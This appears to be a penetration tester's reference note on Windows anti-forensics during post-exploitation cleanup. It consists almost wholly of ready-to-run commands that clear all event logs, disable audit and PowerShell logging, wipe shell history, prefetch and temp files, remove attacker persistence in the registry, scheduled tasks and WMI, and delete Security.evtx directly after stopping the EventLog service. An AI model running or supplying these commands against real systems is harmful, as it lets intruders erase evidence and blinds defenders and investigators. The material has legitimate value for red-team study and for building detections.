# Windows Log Removal & Anti-Forensics

**Tags:** #covering-tracks #windows #logs #opsec
**Phase:** Post-Exploitation → Cleanup

> **Rule:** Wiping all logs is obvious and noisy. Surgical removal of your traces is better.

---

## Event Log Clearing

```cmd
# Clear specific logs (most common approach)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
wevtutil cl "Microsoft-Windows-WMI-Activity/Operational"
wevtutil cl "Microsoft-Windows-TaskScheduler/Operational"

# Clear all logs at once (PowerShell)
Get-WinEvent -ListLog * | ForEach-Object { wevtutil cl $_.LogName } 2>$null

# Via WMI (alternative)
Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }
```

## Disable Audit Logging

```cmd
# Disable all audit categories (temporary — reboot restores GPO settings)
auditpol /set /category:* /success:disable /failure:disable

# Specific categories
auditpol /set /subcategory:"Logon" /success:disable /failure:disable
auditpol /set /subcategory:"Process Creation" /success:disable

# Restore after cleanup
auditpol /set /category:* /success:enable /failure:enable
```

## PowerShell Logging

```powershell
# Disable script block logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
  -Name "EnableScriptBlockLogging" -Value 0

# Disable module logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" `
  -Name "EnableModuleLogging" -Value 0

# Disable transcription
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" `
  -Name "EnableTranscripting" -Value 0

# Clear PowerShell history
Remove-Item -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
Clear-History
```

## File System Artifacts

```cmd
# Delete files securely (overwrite)
cipher /w:C:\Temp   # Overwrite free space in folder
sdelete.exe -p 3 malware.exe   # Sysinternals secure delete

# Clear Recent Documents / Jump Lists
del "%APPDATA%\Microsoft\Windows\Recent\*" /f /q
del "%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\*" /f /q

# Clear Prefetch
del "C:\Windows\Prefetch\*.pf" /f /q

# Clear temp files
del "%TEMP%\*" /f /q /s
del "C:\Windows\Temp\*" /f /q /s
```

## Registry Cleanup

```cmd
# Remove added registry persistence
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f

# Remove recently accessed files list
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f

# Wipe typed URLs
reg delete "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /f
```

## Scheduled Task Removal

```cmd
schtasks /delete /tn "WindowsUpdate" /f
schtasks /delete /tn "SystemInit" /f

# Remove all attacker-created tasks
schtasks /query /fo LIST | findstr "Task Name"
```

## WMI Persistence Cleanup

```powershell
# List WMI subscriptions
Get-WMIObject -Namespace root\subscription -Class __EventFilter
Get-WMIObject -Namespace root\subscription -Class __EventConsumer
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding

# Remove
Get-WMIObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -eq "SystemUpdate"} | Remove-WmiObject
Get-WMIObject -Namespace root\subscription -Class __EventConsumer | Where-Object {$_.Name -eq "SystemUpdate"} | Remove-WmiObject
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
```

## One-Liner Cleanup

```powershell
# PowerShell cleanup one-liner
wevtutil cl System; wevtutil cl Security; wevtutil cl Application;
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -EA SilentlyContinue;
Clear-History;
del "%TEMP%\*" /f /q /s 2>/dev/null;
del "C:\Windows\Temp\*" /f /q /s 2>/dev/null
```

## EVTX Log File Direct Deletion

```powershell
# Stop Windows Event Log service (requires SYSTEM)
Stop-Service EventLog -Force
Remove-Item "C:\Windows\System32\winevt\Logs\Security.evtx" -Force
Remove-Item "C:\Windows\System32\winevt\Logs\System.evtx" -Force
Start-Service EventLog
```

## Related Notes

- [[09-Covering-Tracks/Linux-Log-Removal]] — Linux cleanup
- [[09-Covering-Tracks/Artifact-Cleanup]] — Generic artifacts
- [[00-Quick-Reference/OPSEC]] — Real-time OPSEC guidance
